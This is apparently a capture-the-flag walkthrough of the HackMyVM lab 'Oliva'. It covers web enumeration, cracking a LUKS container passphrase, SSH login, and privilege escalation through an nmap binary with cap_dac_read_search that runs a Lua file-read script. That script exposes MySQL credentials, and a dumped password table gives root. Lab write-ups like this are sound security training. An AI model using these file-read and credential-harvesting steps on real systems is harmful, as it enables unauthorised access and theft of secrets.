# Oliva

## Recon

::: details nmap_scan.log.md
```log

```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/oliva/writeup.png)

```bash
└─$ feroxbuster -u http://10.0.2.190 --thorough -q -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
200      GET       23l       75w      615c http://10.0.2.190/index.html
200      GET    16253l    95433w  4194304c http://10.0.2.190/oliva (truncated to size limit)
200      GET        5l       10w       69c http://10.0.2.190/index.php
```

```bash
└─$ curl http://10.0.2.190/index.php
Hi oliva,
Here the pass to obtain root:
<a href="oliva">CLICK!</a>
```

## LUKS2

```bash
└─$ curl http://10.0.2.190/oliva -Os
└─$ file oliva
oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 {"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},"area":{"type":"raw","offse
```

- [Cracking LUKS/dm-crypt passphrases](https://diverto.github.io/2019/11/18/Cracking-LUKS-passphrases)

Had to get help from others because it would have taken more then few hours to get password

![writeup-1.png](/assets/pentest/hackmyvm/oliva/writeup-1.png)

```bash
└─# echo bebita | cryptsetup luksOpen oliva olive_img
└─# mount /dev/mapper/olive_img /mnt
└─# cd /mnt
└─# find . -ls
        2      1 drwxr-xr-x   3 root     root         1024 Jul  4  2023 .
       13      1 -rw-r--r--   1 root     root           16 Jul  4  2023 ./mypass.txt
       11     12 drwx------   2 root     root        12288 Jul  4  2023 ./lost+found
└─# cat mypass.txt
Yesthatsmypass!
└─# umount /mnt
```

## SSH

```bash
└─$ sshpass -p 'Yesthatsmypass!' ssh oliva@10.0.2.190
oliva@oliva:~$ id
uid=1000(oliva) gid=1000(oliva) grupos=1000(oliva),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

### User.txt

```bash
oliva@oliva:~$ cat user.txt
HMVY0H8NgGJqbFzbgo0VMRm
```

## Privilege Escalation

MySQL is running
```bash
oliva@oliva:~$ ss -tunlp4
Netid   State    Recv-Q   Send-Q       Local Address:Port       Peer Address:Port   Process
udp     UNCONN   0        0                  0.0.0.0:68              0.0.0.0:*
tcp     LISTEN   0        80               127.0.0.1:3306            0.0.0.0:*
tcp     LISTEN   0        128                0.0.0.0:22              0.0.0.0:*
tcp     LISTEN   0        511                0.0.0.0:80              0.0.0.0:*
```

Can't read web files, most likely has creds for MySQL (?)
```bash
oliva@oliva:~$ find /var/www/html/ -ls
   393111      4 drwxr-xr-x   2 root     root         4096 jul  4  2023 /var/www/html/
   391438      4 -rw-rw----   1 www-data www-data      163 jul  4  2023 /var/www/html/index.php
   391038  19532 -rw-rw----   1 www-data www-data 20000000 jul  4  2023 /var/www/html/oliva
   393112      4 -rw-rw----   1 www-data www-data      615 jul  4  2023 /var/www/html/index.html
```

Check SUIDs
```bash
oliva@oliva:~$ find / -perm -4000 -ls 2>/dev/null
   133895     48 -rwsr-xr-x   1 root     root        48896 mar 23  2023 /usr/bin/newgrp
   134051     36 -rwsr-xr-x   1 root     root        35128 mar 23  2023 /usr/bin/umount
   130433     64 -rwsr-xr-x   1 root     root        62672 mar 23  2023 /usr/bin/chfn
   130437     68 -rwsr-xr-x   1 root     root        68248 mar 23  2023 /usr/bin/passwd
   134049     60 -rwsr-xr-x   1 root     root        59704 mar 23  2023 /usr/bin/mount
   134646     72 -rwsr-xr-x   1 root     root        72000 mar 23  2023 /usr/bin/su
   130434     52 -rwsr-xr-x   1 root     root        52880 mar 23  2023 /usr/bin/chsh
   130436     88 -rwsr-xr-x   1 root     root        88496 mar 23  2023 /usr/bin/gpasswd
   145978     52 -rwsr-xr--   1 root     messagebus    51272 feb  8  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   148015    640 -rwsr-xr-x   1 root     root         653888 feb  8  2023 /usr/lib/openssh/ssh-keysign
```

Get capabilities, it's not in path 
```bash
oliva@oliva:~$ getcap
-bash: getcap: orden no encontrada
oliva@oliva:~$ /sbin/getcap
usage: getcap [-h] [-l] [-n] [-r] [-v] <filename> [<filename> ...]

        displays the capabilities on the queried file(s).
```

```bash
oliva@oliva:~$ /sbin/getcap -r / 2>/dev/null
/usr/bin/nmap cap_dac_read_search=eip
/usr/bin/ping cap_net_raw=ep
```

### MySQL

- [https://gtfobins.github.io/gtfobins/nmap/#file-read](https://gtfobins.github.io/gtfobins/nmap/#file-read)

```bash
oliva@oliva:~$ TF=$(mktemp)
oliva@oliva:~$ echo 'local f=io.open("/var/www/html/index.php", "rb"); print(f:read("*a")); io.close(f);' > $TF
oliva@oliva:~$ nmap --script=$TF
...
<?php
$dbname = 'easy';
$dbuser = 'root';
$dbpass = 'Savingmypass';
$dbhost = 'localhost';
?>
...
```

```bash
oliva@oliva:~$ mysql -u'root' -p'Savingmypass' -e 'SHOW DATABASES;'
+--------------------+
| Database           |
+--------------------+
| easy               |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
oliva@oliva:~$ mysql -u'root' -p'Savingmypass' 'easy' -e 'SHOW TABLES;'
+----------------+
| Tables_in_easy |
+----------------+
| logging        |
+----------------+
oliva@oliva:~$ mysql -u'root' -p'Savingmypass' 'easy' -e 'SELECT * FROM logging;'
+--------+------+--------------+
| id_log | uzer | pazz         |
+--------+------+--------------+
|      1 | root | OhItwasEasy! |
+--------+------+--------------+
```

> Creds: `root:OhItwasEasy!`

```bash
oliva@oliva:~$ su
Password:
root@oliva:/home/oliva# id
uid=0(root) gid=0(root) grupos=0(root)
```

### Root.txt

```bash
root@oliva:/home/oliva# cat /root/rutflag.txt
HMVnuTkm4MwFQNPmMJHRyW7
```